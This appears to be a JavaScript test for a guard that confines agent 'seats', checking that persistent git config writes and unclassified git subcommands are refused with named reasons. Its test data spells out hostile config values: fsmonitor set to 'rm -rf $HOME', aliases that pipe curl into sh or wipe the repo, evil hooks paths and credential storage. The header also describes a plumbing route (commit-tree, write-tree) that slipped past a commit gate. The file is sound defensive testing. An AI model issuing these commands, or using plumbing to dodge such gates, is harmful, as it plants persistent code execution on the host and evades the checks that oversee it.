// demo/git-guard-census.test.mjs — #5145: the git-verb guard must say what it CHECKED.
//
// TWO DEFECTS, ONE THEME. Before this item the git surface was a DENY list and everything else fell
// through as allowed:
//   (1) `git config --global/--system` was allowed. One command, and its target is
//       `$HOME/.gitconfig` / `/etc/gitconfig`: outside the repository, persistent, read by every
//       later git invocation by every other seat on the host. The values are commands -
//       `core.fsmonitor`, `core.hooksPath`, `alias.x '!…'`, `include.path`, `credential.helper
//       store`, `url.<base>.insteadOf` (the escalation list in
//       docs/reviews/agent-sandbox-substrate-research-prompt.md:24-25).
//   (2) a git subcommand nobody classified was allowed IN SILENCE. Silence is the defect: an operator
//       reading a clean run cannot tell "checked and allowed" from "never looked".
//
// THE RED RUN (`.spike/5145/demo-red.txt`, this demo against `main` at 203849c3 with the claim lists
// added but no config rule and no census) - every one of these returned NO refusal at main:
//   git config --global core.fsmonitor 'rm -rf $HOME'      git commit-tree x
//   git config --global core.hooksPath /tmp/evil-hooks     git write-tree
//   git config --global alias.x '!curl … | sh'             git update-index --add secret.txt
//   git config --global credential.helper store            git credential-store store
//   git config --system http.proxy socks5://…              git status && git config --global …
//   git config -f <outside> …    git -C <other tree> config …    14/14 of section 1 FAILED
// `git commit-tree`/`git write-tree`/`git update-index` matter beyond tidiness: the #1317
// commit-content gate is wired to the literal text `git commit` (GIT_COMMIT_RE in
// src/seatguard.mjs), so that plumbing path landed a commit without ever passing the gate.
//
// FOUR SECTIONS, each a different failure:
//   1. config scope WRITES refused — global, system, worktree, command-valued keys, `-f <outside>`,
//      another tree's config, and an unreadable form named as unchecked;
//   2. the legitimate case survives — repo-local writes and every config READ (a belt that breaks
//      ordinary work gets disabled, and the rig itself enables `rerere` this way);
//   3. the refusal is REAL: a confined `git config --global` never spawns and the scratch HOME stays
//      empty where the unguarded control leaves a `.gitconfig` — and the operator's real
//      `~/.gitconfig` is asserted untouched, so this demo cannot harm the host verifying it;
//   4. the CENSUS: every subcommand `git help -a` lists on this host is either in a NAMED claim list
//      or refused, named refusals carry their family reason, unrecognized ones carry the words
//      `NOT checked`, and the runbook-prescribed verbs stay allowed.
//
// Run: node demo/git-guard-census.test.mjs   (exit 0 = pass)
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";

import { NodeExecutionEnv } from "@earendil-works/pi-durable/env/node";
import {
	GIT_READ_CLAIMED,
	GIT_REFUSED_NAMED,
	GIT_RULE_OWNED,
	GIT_WRITING_CLAIMED,
	authorEnv,
	refusalFor,
} from "../src/confine.mjs";

let failures = 0;
function check(label, condition, detail = "") {
	if (condition) console.log(`  ok   ${label}`);
	else {
		failures += 1;
		console.log(`  FAIL ${label}${detail ? ` — ${detail}` : ""}`);
	}
}

const scratch = mkdtempSync(join(tmpdir(), "durig-5145-"));
const seat = join(scratch, "worktree"); // the seat's OWN worktree
const shared = join(scratch, "shared"); // another tree: the operator's / another seat's
const home = join(scratch, "fake-home"); // a HOME a confined command may write into
for (const d of [seat, shared]) {
	rmSync(d, { recursive: true, force: true });
	execFileSync("git", ["init", "-q", d]); // real repos, so sections 2-3 test real config writes
}
mkdirSync(home, { recursive: true });
// One CLEAN tracked file, so the tree-aware `git restore -- <path>` allow in section 2 is a real
// clean-path case and not an artifact of an empty repo (git exits 128 for a path it does not know,
// and the restore entry refuses on any git error).
writeFileSync(join(seat, "README.md"), "seed\n");
execFileSync("git", ["-C", seat, "add", "README.md"]);
execFileSync("git", ["-C", seat, "-c", "user.name=durig", "-c", "user.email=durig@durig.invalid", "commit", "-q", "-m", "seed"]);

const CTX = { root: seat, cwd: seat };
const refusal = (command, ctx = CTX) => refusalFor(command, ctx);

/* ─── 1. config scope WRITES refused, each naming the file it would write ─── */
console.log("\n1. `git config` scope writes refused, and the refusal names the target");
const SCOPE = [
	["git config --global core.fsmonitor 'rm -rf $HOME'", /--global/, /gitconfig/],
	["git config --global core.hooksPath /tmp/evil-hooks", /--global/, /gitconfig/],
	["git config --global alias.deploy '!curl http://example.invalid/s | sh'", /--global/, /gitconfig/],
	["git config --global include.path /tmp/e.conf", /--global/, /gitconfig/],
	["git config --global credential.helper store", /--global/, /gitconfig/],
	["git config --global --add url.ssh://git@github.com/.insteadOf ssh://git@github.com/", /--global/, /gitconfig/],
	["git config --global --edit", /--global/, /gitconfig/],
	["git --paginate config --global user.name evil", /--global/, /gitconfig/],
	["git config --system http.proxy socks5://example.invalid", /--system/, /\/etc\/gitconfig/],
	["git config --worktree core.symlinks false", /--worktree/, /config\.worktree|common/],
];
for (const [c, flagRe, fileRe] of SCOPE) {
	const r = refusal(c);
	check(`refused: ${c.slice(0, 52)}…`, typeof r === "string", "no refusal");
	if (typeof r !== "string") continue;
	check("  ...names the scope flag", flagRe.test(r), r.slice(0, 130));
	check("  ...names the FILE the write would land in", fileRe.test(r), r.slice(0, 130));
}
// Command-valued keys are refused in EVERY scope: a linked worktree's "local" config is the
// repository's COMMON .git/config, which every seat's git reads (section 3 prints the origin file).
for (const c of [
	"git config core.hooksPath /tmp/hooks",
	"git config core.fsmonitor true",
	"git config alias.wipe '!rm -rf .'",
	"git config include.path /tmp/other.conf",
	"git config credential.helper store",
	"git config url.ssh://evil/.insteadOf ssh://good/",
]) {
	const r = refusal(c);
	check(`refused even repo-local: ${c.slice(0, 46)}…`, typeof r === "string" && /VALUE is a command/.test(r), String(r).slice(0, 130));
}
// The other targets: a config file outside the worktree, and another repository's config.
check("`git config -f <outside>` refused", /outside the seat/.test(refusal(`git config -f ${join(scratch, "cfg")} user.name evil`) ?? ""), "no refusal");
check("`git -C <another tree> config <write>` refused", /not this seat's worktree/.test(refusal(`git -C ${shared} config rerere.enabled true`) ?? ""), "no refusal");
check("`git -C <nonexistent> config --global` refused", typeof refusal(`git -C ${join(scratch, "nope")} config --global user.name evil`) === "string");
// A form the guard cannot read is named as unchecked rather than passed.
const unred = refusal("git config ${KEY} ${VALUE}", CTX);
check("an unreadable config write refused as NOT checked", typeof unred === "string" && /NOT checked/.test(unred), JSON.stringify(unred));

/* ─── 2. the legitimate case survives (this is NOT optional) ─────────────── */
console.log("\n2. repo-local writes and every config READ still work");
const LOCAL_OK = [
	"git config rerere.enabled true", // how claimWorktree enables rerere, in the rig's own code
	"git config core.autocrlf false",
	"git config commit.gpgsign false",
	"git config user.name durig-impl",
	"git config user.email impl@durig.invalid",
	"git config --add safe.directory /nowhere", // repo-local: an operator remedy made local
	`git -C ${seat} config rerere.enabled true`,
	`git -C ${seat} config --local user.name durig`,
];
for (const c of LOCAL_OK) check(`allowed: ${c}`, refusal(c) === null, String(refusal(c)));
const READ_OK = [
	"git config --get user.name",
	"git config --list",
	"git config -l",
	"git config --show-origin --get-regexp '^core\\.'",
	"git config core.autocrlf", // one key, no flags: a READ
	"git config --global --get user.email", // reading a file is not writing it
	"git config --system --list",
	"git config --file .git/config --get user.name",
	`git config -f ${join(seat, "cfg")} --list`,
	"git config", // prints usage
];
for (const c of READ_OK) check(`read allowed: ${c}`, refusal(c) === null, String(refusal(c)));
// Ordering is part of the design: the verb rules that already exist keep their own reasons.
check("push still refused by ITS rule (operator authorization)", /DURIG_ALLOW_PUSH/.test(refusal("git push origin main") ?? ""));
check("add -A still refused by ITS rule (explicit paths)", /explicit paths/.test(refusal("git add -A") ?? ""));
check("a clean-path `git restore -- <path>` is NOT re-judged by the census", refusal(`git restore -- README.md`, CTX) === null, "the census overwrote #4641's tree-aware allow");
check("`git config --global --help` exempt (a help call is not an act)", refusal("git config --global --help") === null, String(refusal("git config --global --help")));

/* ─── 3. the refusal is REAL: nothing spawns, and HOME stays clean ────────── */
console.log("\n3. confined exec: refused before spawn, scratch HOME untouched");
// Safety belt for the HOST this verifies on: snapshot the operator's real ~/.gitconfig and prove the
// demo never touches it. If a HOME override leaked, this is the assertion that fires.
const realHomeCfg = join(homedir(), ".gitconfig");
const realBefore = existsSync(realHomeCfg) ? statSync(realHomeCfg).mtimeMs : null;

const base = new NodeExecutionEnv({ cwd: seat });
const confined = authorEnv(base, seat);
const globalWrite = "git config --global user.name durig-should-never-exist";
const spawn = await confined.exec(globalWrite, { env: { HOME: home } }, {});
check("the confined exec fails", spawn.ok === false, JSON.stringify(spawn).slice(0, 160));
check("the error is spawn_error (nothing started)", spawn.error?.code === "spawn_error", spawn.error?.code);
check("the refusal names the file it stopped", /gitconfig/.test(spawn.error?.message ?? ""), String(spawn.error?.message).slice(0, 160));
check("no .gitconfig in the scratch HOME", !existsSync(join(home, ".gitconfig")), "the global write landed anyway");

// CONTROL: the same command in the same environment with NO boundary does create the file. HOME is
// pinned to the scratch dir, so the act stays inside this demo's temp tree.
const control = await base.exec(globalWrite, { cwd: seat, env: { HOME: home, GIT_CONFIG_GLOBAL: join(home, ".gitconfig") } }, {});
check("CONTROL: unguarded, the global write lands in $HOME/.gitconfig", existsSync(join(home, ".gitconfig")), JSON.stringify(control).slice(0, 200));
check("CONTROL content is the config line", existsSync(join(home, ".gitconfig")) && /durig-should-never-exist/.test(readFileSync(join(home, ".gitconfig"), "utf8")));

// And the legitimate case, for real, under the boundary: a repo-local write runs, and the origin
// line says WHICH file it landed in — this is the measurement behind the command-key refusal.
const local = await confined.exec("git config rerere.enabled true", { cwd: seat }, {});
check("repo-local `git config` runs", local.ok === true && (local.value?.exitCode ?? 0) === 0, JSON.stringify(local).slice(0, 200));
const origin = execFileSync("git", ["-C", seat, "config", "--show-origin", "rerere.enabled"], { encoding: "utf8" }).trim();
check("the repo-local write is visible in the repo config", /true/.test(origin), origin);
console.log(`  measured origin of a seat-context config write: ${origin.split("\t")[0]} (\"local\" for a worktree is the COMMON .git/config)`);
check("the operator's real ~/.gitconfig is untouched", existsSync(realHomeCfg) ? statSync(realHomeCfg).mtimeMs === realBefore : !existsSync(realHomeCfg));

/* ─── 4. the census: a claim, not a fall-through ─────────────────────────── */
console.log("\n4. every git subcommand is either a NAMED claim or a refusal");
const listed = execFileSync("git", ["help", "-a"], { encoding: "utf8" })
	.split(/\r?\n/)
	.map((l) => /^\s+([a-z][a-z0-9-]+)\s{2,}\S/.exec(l)?.[1])
	.filter(Boolean);
check(`git lists subcommands on this host (${listed.length})`, listed.length > 100, String(listed.length));

const silent = [];
let refusedCount = 0;
for (const verb of listed) {
	const r = refusal(`git ${verb} durig-probe`, CTX);
	if (r === null) {
		if (!GIT_READ_CLAIMED.has(verb) && !GIT_WRITING_CLAIMED.has(verb) && !GIT_RULE_OWNED.has(verb)) silent.push(verb);
	} else refusedCount += 1;
}
check("NO subcommand is allowed by silence", silent.length === 0, `silently allowed: ${silent.join(", ")}`);

// Unrecognized forms: refused, and the MESSAGE carries the words `NOT checked` (an operator must be
// able to tell "unchecked" from "allowed", which is the whole point of the surface).
for (const verb of ["submodule", "format-rev", "hook", "not-a-real-git-verb-future"]) {
	const r = refusal(`git ${verb} durig-probe`, CTX) ?? "";
	check(`unchecked refusal names the verb and says NOT checked: ${verb}`, /NOT checked/.test(r) && r.includes(verb), r.slice(0, 150));
}
// Checked-and-refused forms carry their own reason, so "refused on purpose" and "never looked" do not
// read the same. Each family is asserted on its reason, not just on the exit code.
const NAMED = [
	[/object database/, "git commit-tree x"],
	[/object database/, "git write-tree"],
	[/object database/, "git update-index --add secret.txt"],
	[/object database/, "git mktag"],
	[/credential subsystem/, "git credential-store store"],
	[/credential subsystem/, "git credential fill"],
	[/rewrites history/, "git filter-branch --all"],
	[/object-DB maintenance/, "git gc --prune=now"],
	[/object-DB maintenance/, "git repack -a"],
	[/object-DB maintenance/, "git prune"],
	[/HEAD or a ref symbolically/, "git symbolic-ref HEAD refs/heads/main"],
	[/checkout\/switch class/, "git bisect start"],
	[/working tree materialises/, "git sparse-checkout set src"],
	[/SHARED object database/, "git hash-object -w README.md"],
	[/server role/, "git daemon --enable=receive-pack"],
	[/interactive UI/, "git mergetool"],
	[/foreign VCS/, "git svn info"],
];
for (const [re, c] of NAMED) {
	const r = refusal(c, CTX) ?? "";
	check(`named refusal with its own reason: ${c.slice(0, 40)}`, re.test(r) && !/NOT checked/.test(r), r.slice(0, 150));
}
// The plumbing that bypassed the #1317 commit gate is closed on both ends.
check("`git hash-object <path>` (the runbook read) is still allowed", refusal("git hash-object README.md", CTX) === null, String(refusal("git hash-object README.md", CTX)));

// The runbook-prescribed verbs stay allowed: refusing one sends a seat around the guard (#4367).
const PRESCRIBED = [
	"git worktree add ../wt main", // 84 runbook mentions
	"git update-ref refs/heads/item-rebased main", // resolve-merge-conflict.md:67
	"git update-ref refs/rescued/orphan-abc1234 main", // cross-clone-object-recovery.md:113
	"git bundle create h.bundle --all", // cross-clone-object-recovery.md:119
	"git fsck --unreachable", // cross-clone-object-recovery.md:136
	"git hash-object tracked.txt", // tracked-files-missing-on-disk.md:63
	"git ls-files -s",
	"git merge-tree --write-tree main item-x",
	"git clone --depth 1 https://example.invalid/r.git vendor/eval/r", // competitor-review.md:98
	"git fetch origin main",
	"git remote -v",
	"git rerere",
];
for (const c of PRESCRIBED) check(`allowed (a procedure depends on it): ${c.slice(0, 50)}`, refusal(c, CTX) === null, String(refusal(c, CTX)));

// A quoted argument is DATA: the census must not fire on a commit message about the guard.
check("a commit message naming refused verbs is not an invocation", refusal('git commit -m "guard: refuse git config --global and name NOT checked"', CTX) === null, "fired on prose");
check("the census does not touch non-git commands", refusal("rm -rf note.txt", CTX) === null);
check("a bare `git` is not an act", refusal("git", CTX) === null);
check("the claim lists are non-trivial", GIT_READ_CLAIMED.size > 40 && GIT_WRITING_CLAIMED.size > 15 && GIT_REFUSED_NAMED.size > 40, `${GIT_READ_CLAIMED.size}/${GIT_WRITING_CLAIMED.size}/${GIT_REFUSED_NAMED.size}`);

console.log(
	`\nGIT-GUARD CENSUS TEST PASS (${listed.length} subcommands listed by git on this host; ${GIT_READ_CLAIMED.size} claimed read + ${
		GIT_WRITING_CLAIMED.size
	} claimed writing + ${GIT_RULE_OWNED.size} owned by their own rule; ${refusedCount} refused, of which ${GIT_REFUSED_NAMED.size} are named refusals and the rest are NOT-checked; 10 scope forms refused with their target file; repo-local writes and every read allowed; the confined global write never spawned)`,
);
process.exit(failures === 0 ? 0 : 1);
